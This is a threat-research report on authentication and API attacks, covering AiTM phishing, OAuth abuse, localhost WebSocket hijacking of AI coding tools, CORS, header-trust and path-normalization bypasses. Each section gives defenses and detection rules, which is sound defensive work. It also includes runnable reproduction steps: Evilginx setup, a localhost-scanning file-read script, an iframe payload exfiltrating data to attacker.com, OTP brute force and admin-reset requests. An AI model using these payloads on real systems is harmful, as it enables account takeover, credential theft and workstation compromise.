# Emerging Authentication Threats (2025-2026)

## Overview

This document covers emerging authentication and API security threats identified through adversarially-verified research spanning 24 confirmed findings across JWT manipulation, OAuth abuse, HTTP protocol desynchronization, cloud metadata theft, path normalization bypasses, and supply-chain attacks. Each threat includes reproduction steps, defense recommendations, detection signatures, and relevant CVEs.

---

## 1. Adversary-in-the-Middle (AiTM) Phishing for MFA Bypass and Token Theft

### Severity: CRITICAL

### Description

Reverse-proxy phishing toolkits (Evilginx, Modlishka, Muraena, EvilProxy) position themselves as transparent proxies between the victim and the legitimate authentication server, intercepting session tokens, MFA codes, and OAuth tokens in real time. The attacker obtains a valid, server-issued session cookie or OAuth token that the API accepts as legitimate because it was genuinely issued by the real authentication provider.

Microsoft documented a large-scale AiTM campaign in May 2026 targeting over 35,000 users across more than 13,000 organizations. In January 2026, Okta/Entra accounts were breached via combined vishing and AiTM proxies capturing OTP and push MFA in real time.

### Key Developments

- **OAuth Device Code Flow Abuse (EvilTokens):** Bypasses the proxy entirely by tricking victims into entering attacker-generated device codes at the legitimate Microsoft device login page. The device code flow issues tokens directly to the attacker's polling client, requiring no interception proxy.
- **Microsoft Refresh Token Validity:** Microsoft refresh tokens are valid up to 90 days with a sliding window, providing extended access from a single capture.
- **Defeat of All Non-FIDO2 MFA:** SMS, TOTP, push notifications, and most conditional access policies are all vulnerable to real-time proxy interception. Only about 19% of companies have deployed phishing-resistant FIDO2/WebAuthn passkeys.

### Reproduction Steps

```bash
# Step 1: Infrastructure setup - Deploy Evilginx on a VPS with valid TLS certificate
# Configure phishlet targeting Microsoft 365:
evilginx> phishlets hostname o365 login-portal.attacker.com
evilginx> phishlets enable o365

# Step 2: Generate phishing URL
evilginx> lures create o365
# Output: URL that proxies all traffic to login.microsoftonline.com

# Step 3: Deliver lure via email, SMS, or chat

# Step 4: Victim authenticates through proxy; Evilginx captures:
# - Username and password
# - MFA tokens/codes in real time
# - Session cookie set by the real server
# - OAuth access and refresh tokens

# Step 5: Session replay - Import captured cookie into browser
# Navigate to outlook.office365.com - accepted as legitimate session

# Step 6: Persistence via refresh token
curl -X POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token \
  -d 'grant_type=refresh_token&refresh_token=<stolen_token>&client_id=<app_id>&scope=https://graph.microsoft.com/.default'
```

### Bypass Techniques Against Common Defenses

1. **Against SMS/TOTP MFA:** Proxy captures codes in real time before expiry
2. **Against push notification MFA:** User approves because login appears legitimate (they initiated it)
3. **Against Conditional Access IP policies:** Proxy hosted in same region or using residential proxies
4. **Against device compliance checks:** Session cookie replayed from non-compliant device if token binding not enforced
5. **Against basic phishing detection:** Valid TLS certificates, homograph domains, dynamically generated subdomains
6. **OAuth Device Code Flow (EvilTokens):** Bypasses proxy entirely -- victims enter device code at legitimate Microsoft login page
7. **Against WAF/proxy detection:** Evilginx supports custom HTTP headers and legitimate browser User-Agent mimicry

### Defense: FIDO2/WebAuthn as Phishing-Resistant MFA

FIDO2/WebAuthn passkeys are the only MFA mechanism that cryptographically binds authentication to the legitimate relying party domain. When credentials are presented to a proxy domain, verification fails because:

1. The browser's WebAuthn API checks the relying party ID (RP ID) against the actual domain
2. The challenge-response is cryptographically bound to the origin
3. The private key never leaves the authenticator device
4. No human-readable secret is transmitted that could be proxied

**Implementation Steps:**
- Deploy FIDO2/WebAuthn passkeys (hardware keys like YubiKey, or platform authenticators)
- In Microsoft Entra ID, configure Authentication Strengths to require phishing-resistant methods
- Enable Token Protection (Entra ID preview) to cryptographically bind tokens to the device
- Reduce sign-in session lifetime
- Block legacy authentication protocols

### Detection Signatures

```
# Monitor for new MFA method registrations immediately after sign-in
# Alert on OAuth application consent from unfamiliar applications
# Cross-reference Azure AD sign-in logs with proxy/network logs
# Detect sessions where authenticating IP differs from subsequent session IP
# Watch for mailbox rule creation (inbox rules forwarding/deleting emails)
# Alert on sign-ins from hosting providers or VPS IP ranges
# Monitor for impossible travel patterns
```

### Sources

- https://cybersecuritynews.com/evilginx-aitm-attack-captures-microsoft-credentials/
- https://gbhackers.com/evilginx-operators-stealing-microsoft-365/
- https://thehackernews.com/2026/09/know-your-enemy-browser-based-attack.html
- https://www.deepwatch.com/labs/catching-the-phish-detecting-evilginx-aitm/
- https://luxgap.com/articles/okta-sso-vishing-fido2-mfa-contournement/?lang=en

---

## 2. Supply-Chain OAuth Token Theft (Salesloft/Drift Breach, 700+ Organizations)

### Severity: CRITICAL

### Description

A supply-chain attack where compromising a third-party integration's source code repository enables extraction of OAuth client secrets or refresh tokens, which are then used to access customer data across all organizations that granted the integration OAuth consent.

### Documented Case: Salesloft/Drift Breach (August 2025)

Attributed to threat actor UNC6395:
1. **March-June 2025:** Attackers compromised Salesloft's GitHub account
2. **Credential extraction:** Extracted OAuth credentials from the Drift platform integration
3. **Cross-organization access:** Used legitimately-issued tokens to access Salesforce and Google Workspace data across 700+ organizations
4. **Data targets:** Searched for AWS access keys, Snowflake tokens, and other credentials within customer environments

### Attack Chain

```
Compromise GitHub repo --> Extract OAuth client secrets/refresh tokens
--> Use legitimately-issued tokens --> Access customer data across ALL integrated organizations
--> Search for additional credentials (AWS keys, Snowflake tokens)
--> Lateral movement to cloud infrastructure
```

### Detection and Prevention

```
# Audit third-party OAuth application consents regularly
# List all OAuth apps with consent in your tenant:
# Microsoft Entra ID: Enterprise Applications > Consent and Permissions
# Google Workspace: Security > API Controls > App Access Control

# Monitor for token usage from unexpected IP ranges
# Alert when integration tokens are used from IPs outside the vendor's known ranges

# Implement least-privilege scoping for integration tokens
# Review and minimize OAuth scopes granted to third-party apps

# In vendor breach events:
# - Immediately revoke all OAuth tokens for the compromised vendor
# - Rotate any credentials the vendor had access to
# - Audit access logs for unauthorized data access during breach window
# - Treat ALL tokens stored in third-party platforms as potentially compromised
```

### Key Recommendations

1. Require vendors to use short-lived access tokens with refresh token rotation
2. Implement per-organization token isolation (each customer gets separate credentials)
3. Monitor OAuth token usage patterns for anomalies
4. Maintain an inventory of all third-party OAuth consents
5. Establish incident response procedures for vendor breach scenarios

### Sources

- https://thehackernews.com/2025/08/salesloft-oauth-breach-via-drift-ai.html
- https://securityaffairs.com/181686/cyber-crime/google-salesloft-drift-breach-hits-all-integrations.html

---

## 3. Local WebSocket Hijacking of IDE Extensions (CVE-2025-52882)

### Severity: HIGH (CVSS 8.8-9.3)

### Description

Malicious websites connect to localhost WebSocket servers (IDE extensions like Claude Code MCP server) by brute-forcing port numbers, exploiting the lack of Origin validation (CWE-1385) to execute commands including file reads, code execution, and full workstation compromise.

### Key Insight

The assumption that localhost connections are safe is fundamentally flawed -- any website in the user's browser can connect to localhost WebSocket servers. Browsers enforce the Same-Origin Policy for HTTP requests but NOT for WebSocket connections (they only send the Origin header, they do not enforce it).

### Reproduction Steps

```javascript
// From a malicious webpage, scan localhost ports for MCP WebSocket server:
for (let port = 3000; port < 4000; port++) {
  try {
    let ws = new WebSocket(`ws://localhost:${port}`);
    ws.onopen = () => {
      // Enumerate available tools
      ws.send('{"jsonrpc":"2.0","method":"tools/list","id":1}');
    };
    ws.onmessage = (e) => {
      // Found a live MCP server - read files
      ws.send(JSON.stringify({
        jsonrpc: "2.0",
        method: "tools/call",
        params: {
          name: "read_file",
          arguments: { path: "/etc/passwd" }
        },
        id: 2
      }));
    };
  } catch(e) {}
}
```

```bash
# Port scanning for local WebSocket servers:
for port in $(seq 3000 4000); do
  timeout 1 bash -c "echo | nc -w1 localhost $port" 2>/dev/null && echo "Port $port open"
done
```

### Attack Chain

```
Malicious webpage --> Brute-force localhost ports --> Connect to WebSocket
--> No Origin validation --> Send JSON-RPC commands
--> Read local files, execute code --> Full workstation compromise
```

### Defense Recommendations

1. All WebSocket servers MUST validate the Origin header against an explicit allowlist
2. Use authentication tokens for WebSocket connections, not just Origin checking
3. Bind IDE extension WebSocket servers to a random high port with a per-session secret in the URL
4. Inventory local WebSocket servers started by IDE extensions and development tools
5. Implement post-handshake re-authentication on sensitive operations

### Detection

```bash
# Inventory local WebSocket listeners
netstat -tlnp | grep LISTEN
# or
ss -tlnp | grep LISTEN

# Monitor for unexpected WebSocket connections from browser processes
# Alert on WebSocket upgrade requests with unexpected Origin headers
```

### CVE: CVE-2025-52882
### Fixed in: Claude Code 1.0.24 and VS Code extension 0.1.9

### Sources

- https://securitylabs.datadoghq.com/articles/claude-mcp-cve-2025-52882/
- https://exp10it.io/posts/attack-surface-analysis-of-claude-code/
- https://github.com/advisories/GHSA-9f65-56v6-gxw7

---

## 4. Microsoft 2026 OAuth Redirect Phishing Campaigns

### Severity: HIGH

### Description

Microsoft documented OAuth redirection abuse campaigns (March 2026) targeting government organizations. Threat actors registered OAuth applications in their own Entra ID tenants with redirect URIs pointing to attacker infrastructure, then used legitimate Microsoft/Google login flows to bypass email security filters and deliver malware.

### Attack Mechanism

1. **App Registration:** Attacker registers an OAuth application in their own Entra ID tenant
2. **Malicious Redirect URI:** Configures redirect_uri to point to attacker-controlled domain
3. **Invalid Scope Trick:** Uses intentionally invalid scope so no consent prompt appears (silent redirect)
4. **Phishing Delivery:** Crafts phishing email with OAuth authorization URL
5. **Legitimate Login:** Victim sees legitimate Microsoft login page, authenticates
6. **Redirect to Attacker:** Microsoft redirects to attacker's domain (the registered redirect_uri for the attacker's app)
7. **Payload Delivery:** Attacker's server delivers malware (ZIP files, EvilProxy links)

### Reproduction Steps

```bash
# Step 1: Register OAuth app in attacker's own Entra ID tenant
# Step 2: Configure redirect_uri = https://malware.example.com

# Step 3: Craft authorization URL with invalid scope for silent redirect
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?\
  client_id=ATTACKER_APP_ID\
  &redirect_uri=https://malware.example.com\
  &response_type=code\
  &scope=invalid_scope

# Step 4: Victim clicks link, authenticates at legitimate Microsoft login
# Step 5: Microsoft redirects to attacker domain
# Step 6: Malware payload delivered
```

### Defense Recommendations

1. Monitor Entra ID app registration audit logs for apps with redirect URIs pointing to external/unknown domains
2. Restrict app registration to verified publishers
3. Implement Conditional Access policies restricting OAuth flows
4. Use email security filters that inspect OAuth authorization URLs
5. Block device code flows from unexpected applications via Conditional Access

### Detection Signatures

```
# Alert on authorization requests for unknown client_ids
# Monitor for redirect_uri values pointing to recently registered domains
# Log OAuth flows with invalid/unknown scopes (may indicate redirect abuse)
# Track OAuth app registrations in external tenants that target your users
```

### Sources

- https://www.microsoft.com/en-us/security/blog/2026/03/02/oauth-redirection-abuse-enables-phishing-malware-delivery/
- https://www.theregister.com/2026/03/03/microsoft_oauth_scams/
- https://thehackernews.com/2026/03/microsoft-warns-oauth-redirect-abuse.html

---

## 5. GraphQL Alias Batching for Rate Limit Bypass and Brute Force

### Severity: HIGH

### Description

GraphQL's alias feature allows a single HTTP request to contain thousands of operations targeting the same resolver with different arguments. Rate limiters that count HTTP requests see one request while the server processes thousands of authentication attempts. This enables brute-forcing OTP codes, password guessing, token enumeration, and 2FA bypass -- all invisible to per-request rate limiting.

### Two Batching Forms

1. **Alias Batching:** Packs many aliased copies of one field into a single operation
2. **Array Batching:** Sends a JSON array of separate operations in one HTTP body
3. **Combined (N*M Amplification):** N array elements x M aliases each = N*M resolver executions per HTTP request

### Reproduction Steps

```bash
# Alias-based OTP brute force (single HTTP request = 10,000 attempts):
curl -X POST https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"mutation {
    a0: verifyOTP(code:\"0000\"){success}
    a1: verifyOTP(code:\"0001\"){success}
    a2: verifyOTP(code:\"0002\"){success}
    ...
    a9999: verifyOTP(code:\"9999\"){success}
  }"}'

# Array batching (multiple queries in one request):
curl -X POST https://target/graphql -H 'Content-Type: application/json' \
  -d '[
    {"query":"mutation{login(user:\"admin\",pass:\"password1\"){token}}"},
    {"query":"mutation{login(user:\"admin\",pass:\"password2\"){token}}"},
    {"query":"mutation{login(user:\"admin\",pass:\"password3\"){token}}"}
  ]'

# Combined N*M amplification:
# Send array of 10 operations, each with 1000 aliases = 10,000 attempts
```

### Tools

- **BatchQL** (Assetnote): github.com/assetnote/batchql - Automates batching and alias tests
- **InQL** (Burp Suite extension): github.com/doyensec/inql - Generates queries from introspection
- **graphql-cop**: github.com/dolevf/graphql-cop - Checks batching and alias limits

### Detection and Prevention

```
# WAF Rules:
# Block request bodies over 64KB (oversized queries rarely legitimate)
SecRule REQUEST_BODY "@gt 65536" \
  "id:GQL_OVERSIZED,phase:2,deny,status:413,msg:'Oversized GraphQL request'"

# Alert on requests containing multiple field aliases:
SecRule REQUEST_BODY "@rx [a-z]+[0-9]{2,}:" \
  "id:GQL_ALIAS_BATCH,phase:2,log,msg:'Potential GraphQL alias batching attack'"

# Application-level controls:
# - Implement query cost analysis with field weights multiplied by list cardinality
# - Count each aliased operation toward rate limits (not just HTTP requests)
# - Cap batch size at 3-5 queries
# - Set per-operation rate limits
# - Log query signatures (operation name + normalized document hash)
```

### Chaining Potential

1. Account takeover after brute-forcing credentials or OTP codes
2. Privilege escalation by enumerating admin tokens or session IDs
3. Race condition exploitation -- aliases may run concurrently
4. Denial of service via resource-exhausting queries
5. Information disclosure via error message differences across aliases

### Sources

- https://dev.to/roxdavirox/graphql-in-production-introspection-alias-batching-and-rate-limit-bypass-on-real-apis-32f8
- https://lab.wallarm.com/graphql-batching-attack/
- https://escape.tech/blog/graphql-batch-attacks-cause-dos/
- https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/

---

## 6. Bearer Token Leakage (CVE-2025-27152 Axios, CVE-2026-44883 Portainer)

### Severity: HIGH

### Description

APIs that accept bearer tokens or session tokens in URL query parameters or follow cross-origin redirects with Authorization headers expose credentials through multiple persistence points: browser history, server access logs, proxy/CDN logs, HTTP Referer headers, bookmark syncing, and error logging pipelines.

### CVE-2025-27152: Axios Credential Leakage via Cross-Origin Redirect

The Axios HTTP library forwards Authorization headers (including bearer tokens) when requests follow cross-origin redirects to absolute URLs. The library ignores its configured `baseURL` when a request path is absolute, enabling SSRF and credential leakage to unintended third-party hosts.

```bash
# Reproduction:
# Set up two HTTP servers (legitimate on port 3000, attacker on port 4000)
# Configure Axios with baseURL: 'http://localhost:3000' and Authorization header
# Make request with absolute URL:
# axios.get('http://localhost:4000/steal')
# The Authorization header arrives at port 4000

# Fix: Upgrade Axios to 1.8.2+
```

### CVE-2026-44883: Portainer Token in URL Parameter (CVSS 7.5)

Portainer accepted JWTs via `?token=` query parameters with a default 8-hour lifetime. Tokens were exposed in:

```bash
# Token persists in:
# 1. Reverse proxy access logs
grep 'token=' /var/log/nginx/access.log

# 2. Browser history
# 3. Referer headers sent to third-party resources
# 4. CDN/proxy logs

# Decode leaked token:
echo '<token>' | cut -d. -f2 | base64 -d

# Scan logs for leaked JWTs:
grep -rE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' /var/log/
```

### Additional Leakage Vectors

- **CVE-2020-15125 (Auth0):** Library logged Authorization header values in error objects, leaking bearer tokens into log files
- **RFC 9700 (OAuth 2.0 Security BCP, January 2025):** Explicitly flags that request/response URIs can reach attackers via the Referer header

### Defense Recommendations

1. **Never pass tokens in URL query parameters** -- use Authorization header only
2. **Set Referrer-Policy:** `no-referrer` or `strict-origin-when-cross-origin` on all API-serving domains
3. **Redact sensitive parameters in logs:** Configure reverse proxies to strip `?token=` before logging
4. **Upgrade Axios** to 1.8.2+ to prevent cross-origin credential leakage
5. **Use short-lived tokens:** Minimize the damage window from leaked credentials
6. **Automated log scanning:** Implement JWT pattern detection (`eyJ...`) in log aggregation pipelines

### Detection

```bash
# Scan for JWT patterns in logs:
grep -rE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' /var/log/

# Detect tokens in URLs at the API gateway:
# Alert on Authorization header values appearing in query strings

# Dependency scanning:
npm audit  # Check for vulnerable Axios versions
```

### Sources

- https://github.com/portainer/portainer/security/advisories/GHSA-jvp4-q659-95mj
- https://nvd.nist.gov/vuln/detail/CVE-2026-44883
- https://www.herodevs.com/vulnerability-directory/cve-2025-27152
- https://www.ietf.org/ietf-ftp/rfc/rfc9700.pdf

---

## 7. CORS Misconfiguration Credential Theft (CVE-2024-41659)

### Severity: HIGH (CVSS 8.1)

### Description

APIs that reflect arbitrary origins in `Access-Control-Allow-Origin` while setting `Access-Control-Allow-Credentials: true` allow any website to make authenticated cross-origin requests and read the responses.

### CVE-2024-41659: Memos CORS Misconfiguration

Memos versions 0.20.1 and earlier reflected any requesting origin with credentials enabled, allowing attacking sites to read private data or make changes as the logged-in user.

### Reproduction Steps

```bash
# Step 1: Basic origin reflection test
curl -s -H 'Origin: https://evil.com' https://target-api.com/api/user -v 2>&1 \
  | grep -i 'access-control'
# If response contains:
#   Access-Control-Allow-Origin: https://evil.com
#   Access-Control-Allow-Credentials: true
# The API is VULNERABLE

# Step 2: Null origin test (via sandboxed iframe)
curl -s -H 'Origin: null' https://target-api.com/api/user -v 2>&1 \
  | grep -i 'access-control'

# Step 3: Regex bypass tests
curl -H 'Origin: https://target.com.attacker.com' https://target-api.com/api/user
curl -H 'Origin: https://attackertarget.com' https://target-api.com/api/user
curl -H 'Origin: https://anything.target.com' https://target-api.com/api/user

# Step 4: Exploit via sandboxed iframe (null origin)
# <iframe sandbox="allow-scripts" src="data:text/html,
#   <script>
#     fetch('https://target-api.com/api/user', {credentials:'include'})
#       .then(r=>r.json())
#       .then(d=>navigator.sendBeacon('https://attacker.com/log',JSON.stringify(d)))
#   </script>
# "></iframe>
```

### Bypass Techniques

1. **Null origin via sandboxed iframe:** `sandbox` without `allow-same-origin` sends `Origin: null`
2. **Subdomain takeover chain:** If API trusts `*.target.com` and a subdomain is takeover-able
3. **Regex dot bypass:** Unescaped dot in regex allows `targetXcom.attacker.com`
4. **Protocol downgrade:** If API trusts `http://` alongside `https://`
5. **Preflight cache poisoning:** Cache a permissive preflight response

### Automated Scanning Tools

- **CORStest:** github.com/RUB-NDS/CORStest
- **cors-misconfig-scanner:** github.com/RodneyRoger5/cors-misconfig-scanner
- **Nuclei template:** `cors-misconfig.yaml`

### Defense Recommendations

1. Implement an explicit origin allowlist -- never reflect arbitrary origins
2. Never combine `Access-Control-Allow-Credentials: true` with dynamic origin reflection
3. Use `Vary: Origin` header when Access-Control-Allow-Origin changes per request
4. Audit all CORS configurations in CI/CD pipelines
5. Use `SameSite=Strict` cookies as defense-in-depth

### Sources

- https://securitylab.github.com/advisories/GHSL-2024-034_memos/
- https://github.com/advisories/GHSA-p4fx-qf2h-jpmj
- https://github.com/RUB-NDS/CORStest

---

## 8. X-Forwarded-For Header Trust Bypass (CVE-2024-47070 authentik, CVE-2024-51504 ZooKeeper)

### Severity: CRITICAL

### Description

Applications that trust client-supplied HTTP headers (X-Forwarded-For, X-Original-URL, X-Rewrite-URL) for authentication or authorization decisions are vulnerable to complete bypass via header injection.

### CVE-2024-47070: authentik Password Authentication Bypass (CVSS 9.1)

An unparsable IP in X-Forwarded-For caused policy evaluation to throw an exception and skip the password stage entirely, allowing complete password authentication bypass for any user.

```bash
# Reproduction:
# Step 1: Navigate to authentik login, enter valid username
# Step 2: At password prompt, intercept the POST request
# Step 3: Add header: X-Forwarded-For: notanip
# Step 4: Forward request -- password stage is SKIPPED
# Result: Logged in as target user without knowing their password

# Root cause: Exception from malformed IP causes policy to skip rather than deny
```

### CVE-2024-51504: Apache ZooKeeper Admin Server IP Spoofing (CVSS 9.1)

ZooKeeper's IPAuthenticationProvider trusted X-Forwarded-For, allowing anyone to spoof a trusted source IP and execute admin commands.

```bash
# Reproduction:
curl -H 'X-Forwarded-For: 127.0.0.1' http://target:8080/commands/stat
# If response contains ZooKeeper status, IP-based auth is bypassed

# Execute admin commands:
curl -H 'X-Forwarded-For: 127.0.0.1' http://target:8080/commands/snapshot
curl -H 'X-Forwarded-For: 127.0.0.1' http://target:8080/commands/restore
```

### X-Original-URL / X-Rewrite-URL Path Override

```bash
# Test if backend processes override headers:
curl -H 'X-Original-URL: /nonexistent-path-xyz' https://target/
# If 404 instead of 200, the header is processed

# Access restricted endpoint:
curl -H 'X-Original-URL: /admin/panel' https://target/allowed-public-page
# If response contains admin content, authorization is bypassed

# Try X-Rewrite-URL if X-Original-URL fails:
curl -H 'X-Rewrite-URL: /admin/panel' https://target/allowed-public-page
```

### Defense Recommendations

```nginx
# Nginx: OVERWRITE X-Forwarded-For (do not append)
proxy_set_header X-Forwarded-For $remote_addr;
# NOT: proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

# Strip dangerous override headers:
proxy_set_header X-Original-URL "";
proxy_set_header X-Rewrite-URL "";

# Use nginx realip module with explicit trusted proxy IPs:
set_real_ip_from 10.0.0.0/8;
set_real_ip_from 172.16.0.0/12;
real_ip_header X-Forwarded-For;
real_ip_recursive on;
```

```apache
# Apache: Strip override headers
RequestHeader unset X-Original-URL
RequestHeader unset X-Rewrite-URL
```

### Detection Signatures

```
# WAF rules:
# Block or strip X-Original-URL and X-Rewrite-URL at the edge
# Log requests with unexpected X-Forwarded-For values
# Alert on requests containing non-standard forwarded headers from non-trusted sources

# ModSecurity:
SecRule REQUEST_HEADERS:X-Original-URL "." \
  "id:XOU_BLOCK,phase:1,deny,status:403,msg:'X-Original-URL header blocked'"
SecRule REQUEST_HEADERS:X-Rewrite-URL "." \
  "id:XRU_BLOCK,phase:1,deny,status:403,msg:'X-Rewrite-URL header blocked'"
```

### Key Principle

Never trust client-supplied headers for authorization decisions. Behind Cloudflare, use `CF-Connecting-IP` instead of `X-Forwarded-For`. Always overwrite (not append to) forwarded headers at every trust boundary.

### Sources

- https://docs.goauthentik.io/security/cves/CVE-2024-47070/
- https://logicaltrust.net/blog/2025/03/authentik-CVE-2024-47070.html
- https://www.sentinelone.com/vulnerability-database/cve-2024-51504/
- https://access.redhat.com/security/cve/CVE-2024-51504

---

## 9. Additional Emerging Threats

### 9.1 JWT Claim Validation Bypass via Issuer Array Injection (CVE-2025-30144)

The fast-jwt library's `validateClaimValues` function used `Array.some()` to check issuer claims. An attacker crafts a JWT where the `iss` claim is a JSON array containing both the attacker's domain and the legitimate issuer. Because `some()` returns true if ANY element matches, the validation passes.

```bash
# Original JWT payload: {"iss": "https://auth.legitimate.com", "sub": "user123"}
# Modified payload: {"iss": ["https://evil.com", "https://auth.legitimate.com"], "sub": "admin", "role": "admin"}
# If combined with get-jwks, the library may fetch keys from evil.com
# Sign token with attacker key and send:
curl -H 'Authorization: Bearer <forged_token>' https://target.com/api/admin
```

**Fix:** Upgrade fast-jwt to 5.0.6+. Add application-level validation that `iss` is a string before library processing.

### 9.2 OAuth2-Proxy Authentication Bypass (CVE-2025-54576, CVSS 9.1)

The `skip_auth_routes` regex patterns were evaluated against the full request URI including query parameters, not just the path. Attackers appended query strings matching skip patterns to bypass OAuth2 authentication entirely.

```bash
# If skip_auth_routes = ["^/foo/.*/bar$"]:
curl 'https://target.com/api/sensitive-data?param=/foo/x/bar'
# Full URI matches regex because .* spans across ? into query string
# Authentication is COMPLETELY BYPASSED
```

**Fix:** Upgrade to oauth2-proxy 7.11.0+. Use exact path matches. Implement backend authentication as defense-in-depth.

### 9.3 API Version Downgrade Authentication Bypass (CVE-2026-23760)

Auth middleware registered per version prefix allows older versions to skip newer authentication controls.

```bash
# Version enumeration:
for v in v0 v1 v2 beta internal legacy; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://target/api/$v/users")
  echo "$v: $code"
done

# SmarterMail CVE-2026-23760 (CVSS 9.8-10):
curl -X POST https://target/api/v1/auth/force-reset-password \
  -H 'Content-Type: application/json' \
  -d '{"emailAddress":"admin@target.com","newPassword":"AttackerPass123!","isSysAdmin":true}'
# Unauthenticated admin password reset -> OS command execution (SYSTEM/root)
```

### 9.4 API Gateway Path Normalization Bypass

Semantic gap between gateway path-matching and backend routing enables authentication bypass.

```bash
# Trailing slash bypass (AWS HTTP API, $12K bounty):
curl -v https://api.target.com/v1/accounts     # 401 Unauthorized
curl -v https://api.target.com/v1/accounts/    # 200 OK (bypassed!)

# Double encoding bypass (Astro CVE-2025-66202):
curl -v https://target.com/%2561dmin           # Double encoding bypass

# Double slash bypass (Better Auth CVE-2025-71399):
curl -v https://target.com//sign-in/email      # Bypass rate limiting

# Dot segment traversal (MCP Python SDK):
curl -v https://target.com/api/../admin/       # Path traversal bypass

# Semicolon path parameters (Tomcat):
curl -v https://target.com/admin;jsessionid=fake
```

### 9.5 HTTP Request Smuggling for Auth Bypass

Front-end/back-end parsing discrepancies enable smuggling requests past authentication layers.

**Key CVEs:**
- CVE-2025-55315 (ASP.NET Kestrel, CVSS 9.9): Chunk extension parsing with lone newlines
- CVE-2025-32094 (Akamai): OPTIONS + obsolete line folding
- CVE-2025-64484 (OAuth2-Proxy): Header normalization (underscore vs hyphen)
- CVE-2024-33452 (Kong/OpenResty): HEAD method body confusion

### 9.6 WebSocket Authentication Bypass (CVE-2024-55591 FortiOS)

Zero-day actively exploited since November 2024. Unauthenticated attackers abused the Node.js WebSocket module's `/ws/cli/` endpoint with arbitrary `local_access_token` values, gaining super-admin privileges via the jsconsole interface.

---

## 10. Cross-Cutting Defense Recommendations

### Priority 1: Deploy Phishing-Resistant MFA
- FIDO2/WebAuthn passkeys cryptographically bound to legitimate domains
- Defeats all AiTM/proxy-based attacks
- Only ~19% adoption rate makes this a critical gap

### Priority 2: Normalize Before Authorizing
- All path normalization, URL decoding, header processing BEFORE authorization decisions
- Test with encoding variants (double-encode, dot segments, double slashes, trailing slashes)

### Priority 3: Defense in Depth Authentication
- Never rely on a single authentication layer (gateway AND backend)
- Backend must not blindly trust proxy authentication decisions
- Test that removing one layer does not expose endpoints

### Priority 4: Zero-Trust for Headers and Localhost
- Never trust X-Forwarded-For, localhost connections, or proxy-asserted identity
- Overwrite (do not append to) forwarded headers at every trust boundary
- All WebSocket servers must validate Origin headers

### Priority 5: Monitor OAuth Ecosystem
- Audit third-party OAuth application consents regularly
- Implement least-privilege scoping for integration tokens
- Monitor for token usage from unexpected IP ranges
- Establish vendor breach response procedures
